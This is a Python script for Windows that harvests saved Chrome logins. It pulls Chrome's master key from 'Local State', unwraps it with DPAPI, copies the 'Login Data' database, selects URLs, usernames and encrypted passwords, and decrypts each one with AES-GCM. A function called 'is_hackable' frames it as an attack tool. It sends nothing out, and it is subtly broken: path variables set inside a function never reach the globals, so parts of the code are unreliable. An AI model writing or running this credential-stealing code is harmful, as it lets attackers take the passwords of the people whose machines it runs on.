
import os, json, base64, win32crypt, shutil, sqlite3, threading
from Crypto.Cipher import AES

CHROME_PATH_LOCAL_STATE = None
CHROME_PATH = None

def is_hackable():
        OME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
        CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
        
        return os.path.exists(OME_PATH_LOCAL_STATE) and os.path.exists(CHROME_PATH)

def get_secret_key():    
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None

def fetch_data_from_local_db():
    chrome_path_login_db = CHROME_PATH + r"\Default\Login Data"
    
    shutil.copy2(chrome_path_login_db, "Loginvault.db") 
    
    #Connect to sqlite database
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    
    #Select statement to retrieve info 
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    data = []
    
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext= login[2]
        
        data.append((url, username, ciphertext))
        
    return data
    
def decrypt(ciphertext, secret_key):
    #Step 1: Extracting initilisation vector from ciphertext
    initialisation_vector = ciphertext[3:15]
        
    #Step 2: Extracting encrypted password from ciphertext
    encrypted_password = ciphertext[15:-16]
        
    #Step 3:Build the AES algorithm to decrypt the password
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    
    decrypted_pass = cipher.decrypt(encrypted_password)
    
    decrypted_pass = decrypted_pass.decode()
    
    #Step 4: Decrypted Password    
    return decrypted_pass
    
def get_and_decrypt_all_passwords():
    
    if is_hackable():
        secret_key = get_secret_key()
        
        data = fetch_data_from_local_db()
        
        for index, login in enumerate(data):
            url = login[0]
            username = login[1]
            ciphertext= login[2]
            
            decrypted_pass = decrypt(ciphertext, secret_key)
                    
def run():
    # Start get_and_decrypt_all_passwords in a separate thread
    thread = threading.Thread(target=get_and_decrypt_all_passwords)
    
    thread.start()
    
    thread.join()
        
if __name__ == "__main__":
    run()
    